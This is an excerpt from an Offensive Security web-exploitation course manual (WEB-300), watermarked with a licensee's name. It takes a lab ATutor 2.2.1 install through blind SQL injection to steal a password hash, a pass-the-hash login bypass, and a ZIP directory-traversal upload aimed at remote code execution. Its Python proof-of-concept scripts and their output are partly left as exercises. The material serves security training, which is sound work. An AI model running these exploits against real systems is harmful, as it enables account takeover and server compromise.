Looking at Figure 76, we notice that one of the parameters passed to the server for authentication 
is form_password_hidden, which appears to hold a password hash. Supporting that assumption is 
the fact that we do not see our password anywhere in this POST request. 
Considering that we have full access to the backend ATutor database, we can quickly check if this 
is the hash value that is stored for the teacher account. The ATutor table in which the user 
credentials are stored is called AT_members. 
mysql> select login, password from AT_members; 
+---------+------------------------------------------+ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
94 
| login   | password                                 | 
+---------+------------------------------------------+ 
| teacher | 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e | 
+---------+------------------------------------------+ 
1 row in set (0.00 sec) 
Listing 70 - The password hash for the teacher user account 
The values we see in Figure 76 and Listing 70 do not match, indicating that further processing of 
the user-controlled data is taking place prior to authentication. 
In order to fully understand the authentication process, we need to start analyzing it from the 
login page. We begin by reviewing the code in the login.php script. 
Looking at lines 15-18 we see: 
15: $_user_location    = 'public'; 
16: define('AT_INCLUDE_PATH', 'include/'); 
17: require (AT_INCLUDE_PATH.'vitals.inc.php'); 
18: include(AT_INCLUDE_PATH.'login_functions.inc.php'); 
Listing 71 - The vital code used for authentication 
The portion of code shown in Listing 71 is the only one that is truly relevant to us in login.php. It 
points 
us 
to 
the 
important 
login 
functions 
that 
are 
located 
in 
ATutor/include/login_functions.inc.php. 
While reviewing login_functions.inc.php, the first thing that catches our eye is located at lines 23-
31: 
23: if (isset($_POST['token'])) 
24: { 
25:     $_SESSION['token'] = $_POST['token']; 
26: } 
27: else 
28: { 
29:     if (!isset($_SESSION['token'])) 
30:         $_SESSION['token'] = sha1(mt_rand() . microtime(TRUE)); 
31: } 
Listing 72 - Setting a token value within the session via user-controlled input 
If it is set, the $_POST[‘token’] variable can be used to set the $_SESSION[‘token’] value. Session 
tokens are always an interesting item to keep track of as they are used in unexpected ways at 
times. We’ll make a note of that. 
The authentication process becomes more interesting beginning on line 60. 
60: if (isset($cookie_login, $cookie_pass) && !isset($_POST['submit'])) { 
61:     /* auto login */ 
62:     $this_login        = $cookie_login; 
63:     $this_password    = $cookie_pass; 
64:     $auto_login        = 1; 
65:     $used_cookie    = true; 
66: } else if (isset($_POST['submit'])) { 
67:     /* form post login */ 
68:     $this_password = $_POST['form_password_hidden']; 
69:     $this_login        = $_POST['form_login']; 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
95 
70:     $auto_login        = isset($_POST['auto']) ? intval($_POST['auto']) : 0; 
71:     $used_cookie    = false; 
72: } else if (isset($_POST['submit1'])) { 
73:     /* form post login on autoenroll registration*/ 
74:     $this_password = $_POST['form1_password_hidden']; 
75:     $this_login        = $_POST['form1_login']; 
76:     $auto_login        = isset($_POST['auto']) ? intval($_POST['auto']) : 0; 
77:     $used_cookie    = false; 
78: } 
Listing 73 - Setting the $this_login and $this_password variables via certain conditions 
Since we are not using cookies, but can instead see in our POST request that the submit 
parameter is set, we will concern ourselves with the else branch of login_functions.inc.php on line 
66. There, the code allows us to set the $this_login and $this_password variables via the 
$_POST[‘form_login’] and $_POST[‘form_password_hidden’] variables respectively. We’ll make a 
note of that as well. 
Next, we see another chunk of code that is largely inconsequential to us at this point, although 
there a couple of items worth pointing out. 
080: if (isset($this_login, $this_password)) { 
081:     if (version_compare(PHP_VERSION, '5.1.0', '>=')) { 
082:         session_regenerate_id(TRUE); 
083:     } 
084:  
085:  
086:     if ($_GET['course']) { 
087:         $_POST['form_course_id'] = intval($_GET['course']); 
088:     } else { 
089:         $_POST['form_course_id'] = intval($_POST['form_course_id']); 
090:     } 
091:     $this_login    = $addslashes($this_login); 
092:     $this_password = $addslashes($this_password); 
093:  
094:     //Check if this account has exceeded maximum attempts 
095:     $rows = queryDB("SELECT login, attempt, expiry FROM %smember_login_attempt 
WHERE login='%s'", array(TABLE_PREFIX, $this_login), TRUE); 
096:      
097:     if ($rows && count($rows) > 0){ 
098:         list($attempt_login_name, $attempt_login, $attempt_expiry) = $rows; 
099:     } else { 
100:         $attempt_login_name = ''; 
101:         $attempt_login = 0; 
102:         $attempt_expiry = 0; 
103:     } 
104:     if($attempt_expiry > 0 && $attempt_expiry < time()){ 
105:         //clear entry if it has expired 
106:         queryDB("DELETE FROM %smember_login_attempt WHERE login='%s'", 
array(TABLE_PREFIX, $this_login)); 
107:         $attempt_login = 0;     
108:         $attempt_expiry = 0; 
109:     }  
Listing 74 - Additional authentication logic 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
96 
Since the $this_login and $this_password variables are set as we saw in Listing 73, we know that 
we will enter the if branch on line 80. Then, if we recall from the previous section, the $addslashes 
function calls on lines 91 and 92 will really not sanitize anything. The remainder of this code 
chunk does not really affect us in any way, so we can move on. 
Finally, we arrive at the most interesting part of the authentication logic beginning at line 111. 
111:     if ($used_cookie) { 
112:         #4775: password now store with salt 
113:         $rows = queryDB("SELECT password, last_login FROM %smembers WHERE 
login='%s'", array(TABLE_PREFIX, $this_login), TRUE); 
114:         $cookieRow = $rows; 
115:         $saltedPassword = hash('sha512', $cookieRow['password'] . hash('sha512', 
$cookieRow['last_login'])); 
116:         $row = queryDB("SELECT member_id, login, first_name, second_name, 
last_name, preferences,password AS pass, language, status, last_login FROM %smembers 
WHERE login='%s' AND '%s'='%s'", array(TABLE_PREFIX, $this_login, $saltedPassword, 
$this_password), TRUE); 
117:     } else { 
118:         $row = queryDB("SELECT member_id, login, first_name, second_name, 
last_name, preferences, language, status, password AS pass, last_login FROM %smembers 
WHERE (login='%s' OR email='%s') AND SHA1(CONCAT(password, '%s'))='%s'", 
array(TABLE_PREFIX, $this_login, $this_login, $_SESSION['token'], $this_password), 
TRUE); 
119:     } 
Listing 75 - We must land in the second branch statement 
As we can see in Listing 75, since we are not using a cookie for the authentication, we 
automatically land in the second branch. At line 118, the application finally composes the 
authentication query and if we focus only on the important parts of that query, we see the 
following: 
...FROM %smembers WHERE (login='%s' OR email='%s') AND SHA1(CONCAT(password, 
'%s'))='%s'", array(TABLE_PREFIX, $this_login, $this_login, $_SESSION['token'], 
$this_password), TRUE); 
Listing 76 - The authentication query 
First of all, we can see that the $this_login and $this_password variables are properly passed to 
the queryDB function in an array. Unlike the vulnerability we already described at the beginning of 
this module, there is no SQL injection here. However, let’s focus on the critical comparison that 
decides the authentication outcome. If we zoom in even more and substitute the string 
formatting placeholders with the appropriate values from the array we obtain the following: 
...AND SHA1(CONCAT(password, $_SESSION['token']))=$this_password; 
Listing 77 - Critical part of the authentication query 
We can control the session token and in Listing 73, we saw that $this_password is also directly 
controlled by us. Therefore, we control almost all of the parts of this equation. The password 
parameter is seemingly the only unknown–unless, of course, we retrieve it using the SQL injection 
vulnerability from the previous section! 
Finally, if we manage to satisfy this query so that it returns a result set, we will be logged in, as 
shown in the code snippet below: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
97 
117:     } else { 
118:         $row = queryDB("SELECT member_id, login, first_name, second_name, 
last_name, preferences, language, status, password AS pass, last_login FROM %smembers 
WHERE (login='%s' OR email='%s') AND SHA1(CONCAT(password, '%s'))='%s'", 
array(TABLE_PREFIX, $this_login, $this_login, $_SESSION['token'], $this_password), 
TRUE); 
119:     } 
... 
128:     } else if (count($row) > 0) { 
129:         $_SESSION['valid_user'] = true; 
130:         $_SESSION['member_id']    = intval($row['member_id']); 
131:         $_SESSION['login']        = $row['login']; 
132:         if ($row['preferences'] == "") 
133:             
assign_session_prefs(unserialize(stripslashes($_config["pref_defaults"])), 1); 
134:         else 
135:             assign_session_prefs(unserialize(stripslashes($row['preferences'])), 
1); 
136:         $_SESSION['is_guest']    = 0; 
137:         $_SESSION['lang']        = $row['language']; 
138:         $_SESSION['course_id']  = 0; 
139:         $now = date('Y-m-d H:i:s'); 
Listing 78 - If the authentication query returns a result set, the login attempt will be validated 
kali@kali:~/atutor$ python atutor_gethash.py atutor 
(+) Retrieving username.... 
teacher 
(+) done! 
(+) Retrieving password hash.... 
8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e 
(+) done! 
(+) Credentials: teacher / 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e 
Listing 79 - Using the ATutor SQL injection to retrieve the teacher password hash 
As shown above, by updating the previous proof of concept script, we are able to steal the 
password hash of the teacher user. At this point, we have, and control, everything we need to 
satisfy the comparison equation in the authentication query. 
3.6.1.1 Exercise 
Modify and use the following proof of concept to retrieve the teacher credentials 
import requests 
import sys 
 
def searchFriends_sqli(ip, inj_str): 
    for j in range(32, 126): 
        # now we update the sqli 
        target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % 
(ip, inj_str.replace("[CHAR]", str(j))) 
        r = requests.get(target) 
        #print r.headers 
        content_length = int(r.headers['Content-Length']) 
        if (content_length > 20): 
            return j 
    return None     
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
98 
 
def inject(r, inj, ip): 
    extracted = "" 
    for i in range(1, r): 
        injection_string = 
"test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i) 
        retrieved_value = searchFriends_sqli(ip,  injection_string) 
        if(retrieved_value): 
            extracted += chr(retrieved_value) 
            extracted_char = chr(retrieved_value) 
            sys.stdout.write(extracted_char) 
            sys.stdout.flush() 
        else: 
            print "\n(+) done!" 
            break 
    return extracted 
 
def main(): 
    if len(sys.argv) != 2: 
        print "(+) usage: %s <target>"  % sys.argv[0] 
        print '(+) eg: %s 192.168.121.103'  % sys.argv[0] 
        sys.exit(-1) 
 
    ip = sys.argv[1] 
 
    print "(+) Retrieving username...." 
    query = ---------------------FIX ME--------------------- 
    username = inject(50, query, ip) 
    print "(+) Retrieving password hash...." 
    query = ---------------------FIX ME--------------------- 
    password = inject(50, query, ip) 
    print "(+) Credentials: %s / %s" % (username, password) 
 
 
if __name__ == "__main__": 
    main() 
 
Listing 80 - Proof of concept to retrieve data from the ATutor database 
3.6.1.2 Extra Mile 
Try to modify the script from the previous exercise so that you can retrieve the admin account 
password hash. 
3.7 Authentication Gone Bad 
In the previous section, we saw that the ATutor authentication mechanism appears to hinge on a 
single parameter whose value is assumed to be secret. If that value can be discovered however, 
the assumptions of the authentication mechanism fall apart. 
In fact, since the token is under our control, it turns out that the $_POST[‘form_password_hidden’] 
value can be trivially calculated. 
This login logic can be confirmed in ATutor/themes/simplified_desktop/login.tmpl.php and 
ATutor/themes/simplified_desktop/registration.tmpl.php as shown in the following listings: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
99 
05: <script type="text/javascript"> 
06: /*  
07:  * Encrypt login password with sha1 
08:  */ 
09: function encrypt_password() { 
10:     document.form.form_password_hidden.value = 
hex_sha1(hex_sha1(document.form.form_password.value) + "<?php echo $_SESSION['token']; 
?>"); 
11:     document.form.form_password.value = ""; 
12:     return true; 
13: } 
14:  
15: </script> 
Listing 81 - The user password is hashed twice in login.tmpl.php prior to login attempts 
14:     if (err.length > 0) 
15:     { 
16:         document.form.password_error.value = err; 
17:     } 
18:     else 
19:     { 
20:         document.form.form_password_hidden.value = 
hex_sha1(document.form.form_password1.value); 
21:         document.form.form_password1.value = ""; 
22:         /*document.form.form_password2.value = "";*/ 
23:     } 
Listing 82 - The user password is hashed once in registration.tmpl.php prior to registration 
The important thing to note here is that during registration, the user password is hashed only 
once, but during login attempts it is hashed twice (once with the token value that we control). 
At this point, we have acquired enough knowledge about the authentication process that we can 
implement our attack. If we use the hash we retrieved in the previous section with the 
atutor_login.py proof of concept, the result should look like the following: 
kali@kali:~/atutor$ python atutor_login.py atutor 
8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e 
(+) success! 
Listing 83 - Using only the teacher password hash, we can successfully authenticate to ATutor 
3.7.1.1 Exercise 
Based on the knowledge you acquired about the authentication process, complete the script 
below and use it to authenticate to the ATutor web application using the teacher account and 
password hash you retrieved from the ATutor database. Remember that the authentication query 
tells you exactly how to calculate the hash. You just have to re-implement that logic in your script. 
import sys, hashlib, requests 
 
def gen_hash(passwd, token): 
    # COMPLETE THIS FUNCTION 
 
def we_can_login_with_a_hash(): 
    target = "http://%s/ATutor/login.php" % sys.argv[1] 
    token = "hax" 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
100 
    hashed = gen_hash(sys.argv[2], token) 
    d = { 
        "form_password_hidden" : hashed, 
        "form_login": "teacher", 
        "submit": "Login", 
        "token" : token 
    } 
    s = requests.Session() 
    r = s.post(target, data=d) 
    res = r.text 
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res: 
        return True 
    return False 
 
def main(): 
    if len(sys.argv) != 3: 
        print "(+) usage: %s <target> <hash>" % sys.argv[0] 
        print "(+) eg: %s 192.168.121.103 56b11a0603c7b7b8b4f06918e1bb5378ccd481cc" % 
sys.argv[0] 
        sys.exit(-1) 
    if we_can_login_with_a_hash(): 
        print "(+) success!" 
    else: 
        print "(-) failure!" 
 
if __name__ == "__main__": 
    main() 
 
Listing 84 - atutor_login.py proof of concept script 
3.7.1.2 Extra Mile 
Is there a different way to bypass the authentication? If yes, create a proof of concept script to do 
so. 
3.8 Bypassing File Upload Restrictions 
While we managed to gain authenticated privileged access to the ATutor web application 
interface so far in this module, we are still not finished. As attackers, we try to gain full operating 
system access and fortunately for us, ATutor contains additional vulnerabilities that allow us to 
do so. 
One of the more direct ways of compromising the host operating system, once we have managed 
to gain access to a web application interface, is to find and misuse file upload weaknesses. Such 
weaknesses could allow us to upload malicious files to the webserver, access them through a 
web browser, and thereby gain command execution ability. As this is a rather well-known attack 
vector, most developers write sufficient validation routines that prevent misuse of this 
functionality. In most cases, this means that certain file extensions will be blacklisted (depending 
on the technology in use) and that the upload locations on the file system are outside of the web 
root directory. 
Sometimes however, despite their best intentions, developers make mistakes. ATutor version 
2.2.1 contains at least two such mistakes, one of which we will describe in this module. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
101 
As we were attempting to learn more about the ATutor functionality through its web interface, it 
became apparent that teacher-level accounts have the ability to upload files in the Tests and 
Surveys section via the URI ATutor/mods/_standard/tests/index.php: 
 
Figure 77: Attempting to upload a file 
 
Figure 78: An upload request intercepted by Burp 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
102 
3.8.1.1.1 
 
 
Figure 79: Server response provides minimal information 
 
Figure 80: Final server response provides more information 
Our first attempt to upload a simple text file results in an error message indicating that we can 
only upload valid ZIP files (Figure 77, Figure 78, Figure 79 and Figure 80). 
Since the application explicitly states that a ZIP file is required, we can investigate further and 
repeat the upload process using a generic ZIP file. A ZIP file can be generated with the help of the 
following Python script. 
#!/usr/bin/python 
import zipfile 
from cStringIO import StringIO 
 
def _build_zip(): 
    f = StringIO() 
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED) 
    z.writestr('poc/poc.txt', 'offsec') 
    z.close() 
    zip = open('poc.zip','wb') 
    zip.write(f.getvalue()) 
    zip.close() 
 
_build_zip() 
Listing 85 - Python code that generates a ZIP file containing the poc.txt file. The text file contains the string ‘offsec’ 
The short script in Listing 85 creates a text file in a directory (poc/poc.txt) and then compresses it 
into an archive called poc.zip. 
kali@kali:~$ ./atutor-zip.py 
 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
103 
kali@kali:~$ ls -la poc.zip 
-rw-r--r-- 1 root root 116 Sep  3 13:56 poc.zip 
Listing 86 - Generating the ZIP file 
We proceed by uploading the newly-created poc.zip file to ATutor to see if we can get around the 
previous error. 
 
Figure 81: Uploading a ZIP file still doesn’t pass content inspection 
The ZIP file appears to have been accepted, but this time an error message indicates that the 
archive is missing an IMS manifest file. This suggests that the contents of the ZIP archive are 
being inspected as well. Therefore, we are going to have to determine what exactly an IMS 
manifest file is, and see if we can generate one to include inside the ZIP archive. 
At this point, we need to switch to a grey/white box approach in order to effectively audit this 
target, as guessing what the application is expecting is going to be very hard, if not impossible. 
After all, not all vulnerabilities can be identified solely from a black box perspective. Considering 
that we have access to the source code, let’s determine if it’s possible to bypass the content 
inspection. 
The first step is to identify which of the ATutor PHP files we need to audit. A good starting point is 
to grep for the “IMS manifest file is missing” error message that was returned while uploading our 
ZIP file: 
student@atutor:~$ grep -ir "IMS manifest file is missing" /var/www/html/ATutor --color 
/var/www/html/ATutor/include/install/db/atutor_language_text.sql:('en', '_msgs', 
'AT_ERROR_NO_IMSMANIFEST', 'IMS manifest file is missing. This does not appear to be a 
valid IMS content package or common cartridge.', '2009-11-17 12:38:14', ''), 
Listing 87 - Grepping for the error string 
Our search attempt finds the error message in the installation file atutor_language_text.sql, which 
shows that the error message is defined as the constant AT_ERROR_NO_IMSMANIFEST. 
This also suggests that a good number of the application error messages are stored in the 
database. By looking through the code, we quickly realize that the constant naming format found 
in the database installation file does not quite match the error constant names used in the source 
code. Specifically, the AT_ERROR prefix is omitted in the code. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
104 
student@atutor:~$ grep -ir "addError(" /var/www/html/ATutor --color 
/var/www/html/ATutor/help/contact_support.php:        $msg->addError('SECRET_ERROR'); 
/var/www/html/ATutor/help/contact_support.php:      $msg->addError('EMAIL_INVALID'); 
/var/www/html/ATutor/help/contact_support.php:      $msg-
>addError(array('EMPTY_FIELDS', $missing_fields)); 
/var/www/html/ATutor/bounce.php:    $msg->addError('ITEM_NOT_FOUND'); 
/var/www/html/ATutor/bounce.php:                $msg-
>addError(array('COURSE_NOT_RELEASED', AT_Date(_AT('announcement_date_format'), 
$row['u_release_date'], AT_DATE_UNIX_TIMESTAMP))); 
/var/www/html/ATutor/bounce.php:                $msg->addError(array('COURSE_ENDED', 
AT_Date(_AT('announcement_date_format'), $row['u_end_date'], 
AT_DATE_UNIX_TIMESTAMP))); 
/var/www/html/ATutor/bounce.php:            $msg-
>addError(array('COURSE_NOT_RELEASED', AT_Date(_AT('announcement_date_format'), 
$row['u_release_date'], AT_DATE_UNIX_TIMESTAMP))); 
/var/www/html/ATutor/bounce.php:            $msg->addError(array('COURSE_ENDED', 
AT_Date(_AT('announcement_date_format'), $row['u_end_date'], 
AT_DATE_UNIX_TIMESTAMP))); 
/var/www/html/ATutor/bounce.php:            $msg-
>addError(array('COURSE_NOT_RELEASED', AT_Date(_AT('announcement_date_format'), 
$row['u_release_date'], AT_DATE_UNIX_TIMESTAMP))); 
/var/www/html/ATutor/bounce.php:            $msg->addError(array('COURSE_ENDED', 
AT_Date(_AT('announcement_date_format'), $row['u_end_date'], 
AT_DATE_UNIX_TIMESTAMP))); 
/var/www/html/ATutor/bounce.php:            $msg-
>addError(array('COURSE_NOT_RELEASED', AT_Date(_AT('announcement_date_format'), 
$row['u_release_date'], AT_DATE_UNIX_TIMESTAMP))); 
/var/www/html/ATutor/bounce.php:            $msg->addError(array('COURSE_ENDED', 
AT_Date(_AT('announcement_date_format'), $row['u_end_date'], 
AT_DATE_UNIX_TIMESTAMP))); 
/var/www/html/ATutor/registration.php:          $msg->addError('SECRET_ERROR'); 
/var/www/html/ATutor/registration.php:          $msg->addError('LOGIN_CHARS'); 
/var/www/html/ATutor/registration.php:              $msg->addError('LOGIN_EXISTS'); 
/var/www/html/ATutor/registration.php:                  $msg-
>addError('LOGIN_EXISTS'); 
... 
Listing 88 - AT_ERROR prefix is not used throughout the code base 
With this information, we can repeat the search with grep, looking for the NO_IMSMANIFEST 
constant. 
student@atutor:~$ grep -ir "NO_IMSMANIFEST" /var/www/html/ATutor --color 
/var/www/html/ATutor/include/install/db/atutor_language_text.sql:('en', '_msgs', 
'AT_ERROR_NO_IMSMANIFEST', 'IMS manifest file is missing. This does not appear to be a 
valid IMS content package or common cartridge.', '2009-11-17 12:38:14', ''), 
/var/www/html/ATutor/mods/_core/imscp/ims_import.php:   $msg-
>addError('NO_IMSMANIFEST'); 
/var/www/html/ATutor/mods/_standard/tests/import_test.php: $msg-
>addError('NO_IMSMANIFEST'); 
/var/www/html/ATutor/mods/_standard/tests/question_import.php:  $msg-
>addError('NO_IMSMANIFEST'); 
Listing 89 - Grepping for the error string omitting the AT_ERROR prefix 
In Listing 89, we find that our error constant is used in multiple locations in the code, indicating 
that if the file upload is vulnerable, there may be multiple paths to the same vulnerability. Let’s 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
105 
focus on import_test.php for now though, as this file is directly used in the import HTML form 
used for the upload (Figure 82). 
 
Figure 82: The Upload HTML form makes direct use of the import_test.php file 
Starting on line 220 in ATutor/mods/_standard/tests/import_test.php (Listing 90), we find 
references to the manifest file and also see the NO_IMSMANIFEST error being referenced in case 
the manifest file is missing. 
220: $ims_manifest_xml = @file_get_contents($import_path.'imsmanifest.xml'); 
221:  
222: if ($ims_manifest_xml === false) { 
223:    $msg->addError('NO_IMSMANIFEST'); 
224:  
225:    if (file_exists($import_path . 'atutor_backup_version')) { 
226:        $msg->addError('NO_IMS_BACKUP'); 
227:    } 
Listing 90 - Manifest file handling 
From the code in the Listing 90, it is clear that the ZIP archive needs to contain a file named 
imsmanifest.xml. Therefore, we can go ahead and update our script to create it: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
106 
#!/usr/bin/python 
import zipfile 
from cStringIO import StringIO 
 
def _build_zip(): 
    f = StringIO() 
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED) 
    z.writestr('poc/poc.txt', 'offsec') 
    z.writestr('imsmanifest.xml', '<validTag></validTag>') 
    z.close() 
    zip = open('poc.zip','wb') 
    zip.write(f.getvalue()) 
    zip.close() 
 
_build_zip() 
Listing 91 - The updated PoC creates a ZIP archive that includes the required XML manifest file 
Note that our script shown in the listing above is creating a valid and properly formatted XML file, 
which is able to pass the parser checks starting on line 239 in import_test.php: 
239: $xml_parser = xml_parser_create(); 
240:  
241: xml_parser_set_option($xml_parser, XML_OPTION_CASE_FOLDING, false); /* conform to 
W3C specs */ 
242: xml_set_element_handler($xml_parser, 'startElement', 'endElement'); 
243: xml_set_character_data_handler($xml_parser, 'characterData'); 
244:  
245: if (!xml_parse($xml_parser, $ims_manifest_xml, true)) { 
246:    die(sprintf("XML error: %s at line %d", 
247:                xml_error_string(xml_get_error_code($xml_parser)), 
248:                xml_get_current_line_number($xml_parser))); 
249: } 
250:  
251: xml_parser_free($xml_parser); 
Listing 92 - XML validation 
We can finally attempt to upload our newly-generated archive with the well-formed 
imsmanifest.xml file inside. The result is shown in Figure 83, where we are told that our file has 
been imported successfully. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
107 
 
Figure 83: Successful upload of a ZIP file 
Nevertheless, uploading a properly formatted ZIP file is not exactly very useful to us, nor is it our 
goal. But we have already seen that the contents of a given ZIP file are extracted and inspected to 
some degree. Logically, that means that the uploaded archive has to be extracted at some point 
and therefore we can assume that our proof of concept file poc.txt would be located somewhere 
on the file system. 
This can be verified by searching locally on the target machine for the poc.txt file using elevated 
permissions in order to ensure that the entire file system is checked for the presence of our file. 
student@atutor:~$ sudo find / -name "poc.txt" 
student@atutor:~$ 
Listing 93 - We are unable to permanently write to disk 
However, it appears that a successful import means that our ZIP file is extracted and then later 
deleted along with its contents. As shown in Listing 93, there’s no trace of poc.txt on the target 
machine. Since our goal is to permanently write a file to the disk (hopefully an evil PHP file), we 
need to find a way to ensure that the uploading process fails just after the extraction. 
If we look back at the XML validation code chunk (Listing 92), we can see on line 245 that a failed 
attempt to parse the contents of the imsmanifest.xml file would actually force the PHP script to 
die with an error message (line 246). Therefore, assuming that no other PHP code is executed 
after this point, we should be able to permanently write a file of our choice to the target file 
system by including an improperly formed imsmanifest.xml file. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
108 
It’s interesting to note how our overzealous attempt at creating a valid XML file actually prevented 
us from reaching our goal in our first attempt. Let’s quickly try this approach with the following 
updated script: 
#!/usr/bin/python 
import zipfile 
from cStringIO import StringIO 
 
def _build_zip(): 
    f = StringIO() 
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED) 
    z.writestr('poc/poc.txt', 'offsec') 
    z.writestr('imsmanifest.xml', 'invalid xml!') 
    z.close() 
    zip = open('poc.zip','wb') 
    zip.write(f.getvalue()) 
    zip.close() 
 
_build_zip() 
Listing 94 - The updated PoC creates a ZIP archive with an invalid manifest file inside 
We can now upload our new ZIP file with malformed XML content in imsmanifest.xml and 
validate our attack approach (Figure 84). 
 
Figure 84: Uploading a raw ZIP file with an invalid imsmanifest.xml file 
This time, the response we receive from the web application states that the XML file is not well-
formed, which seems to suggest that we have been successful (Figure 85)! 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
109 
 
Figure 85: Getting an error message when uploading with invalid XML data 
Let’s verify this on the target machine by again searching the entire filesystem for the poc.txt file: 
student@atutor:~$ sudo find / -name "poc.txt" 
/var/content/import/1/poc/poc.txt 
Listing 95 - The file poc.txt was written to the /var/content/import/1/poc/ directory 
Excellent! Our uploaded file has indeed remained on the file system after being extracted. 
However, there are still a couple more hurdles we need to overcome. 
3.8.1.2 Exercise 
1. 
Recreate the steps from the previous section and make sure you can successfully upload a 
proof of concept file of your choice to the ATutor host 
2. 
Attempt to upload a PHP file 
3.9 Gaining Remote Code Execution 
Now that we have a basic understanding of this file upload vulnerability, let’s attempt to exploit it. 
You likely noticed that the file is extracted under the /var/content directory. This is the default 
directory that is used by ATutor for all user-managed content files and presents a problem for us. 
Even if we can upload arbitrary PHP files, we will not be able to reach this directory from the web 
interface as it is not located within the web directory. 
3.9.1 Escaping the Jail 
The first option that comes to mind is to use a directory traversal38 attack to break out of this 
“jail”. Let’s try this approach by updating our script to attempt to write the poc.txt file to a writable 
directory outside of /var/content. More specifically, let’s attempt to write to the /tmp directory, 
which is writable by any user. 
#!/usr/bin/python 
import zipfile 
from cStringIO import StringIO 
 
38 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Directory_traversal_attack 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
110 
 
def _build_zip(): 
    f = StringIO() 
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED) 
    z.writestr('../../../../../tmp/poc/poc.txt', 'offsec') 
    z.writestr('imsmanifest.xml', 'invalid xml!') 
    z.close() 
    zip = open('poc.zip','wb') 
    zip.write(f.getvalue()) 
    zip.close() 
 
_build_zip() 
Listing 96 - The updated proof of concept implements a directory traversal attack 
We updated the highlighted line in Listing 96 in order to attempt to traverse to the parent directory 
during the ZIP extraction process, ultimately writing the file to /tmp. 
As expected, our upload attempt with the newly-crafted archive still fails with the error message 
“XML error: Not well-formed (invalid token) at line 1”, but this time we have hopefully written 
outside of our jail. 
student@atutor:~$ sudo find / -name "poc.txt" 
/tmp/poc/poc.txt 
Listing 97 - Our file has been written to the /tmp/poc/ directory 
Listing 97 confirms that we have escaped the /var/content jail! 
Given our progress up to this point, and with the goal of gaining remote code execution, we have 
to fulfill three more requirements: 
1. 
Knowledge of the web root path on the file system, so we know where to traverse to 
2. 
A writable location inside of the web root where we can write files 
3. 
A file extension that can be used to execute PHP code 
3.9.2 Disclosing the Web Root 
Since we are using a white box approach for this test case, we already know that the web root is 
set to /var/www/html. 
However, in a black box scenario, there might be alternative approaches available. A typical 
example is the abuse of the display_errors39 PHP settings, which we discussed earlier. 
Once again, it is important to state that this type of information disclosure is a configuration issue 
and as such, is unrelated to any vulnerabilities in the source code. Nonetheless, it’s a common 
mistake and it’s important to know how to exploit it, especially in shared hosting environments 
where the default web root directory structures are almost always changed. 
A good example of how to leverage the display_errors misconfiguration is by sending a GET 
request with arrays injected as parameters. This technique, known as Parameter Pollution or 
Parameter Tampering relies on the fact that most back-end code does not expect arrays as input 
 
39 (PHP Group, 2020), http://php.net/manual/en/errorfunc.configuration.php#ini.display-errors 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
111 
data, when that data is retrieved from a HTTP request. For example, the application may directly 
be passing the $GET[“some_parameter”] variable into a function that is expecting a string data 
type. However, since we can change the data type of the some_parameter from string to an array, 
we can trigger an error. 
For the sake of completeness, let’s attempt this information disclosure vector on the ATutor web 
application. Since we have already enabled display_errors in a previous section, we can try the 
array injection attack in the ATutor browse.php file as follows: 
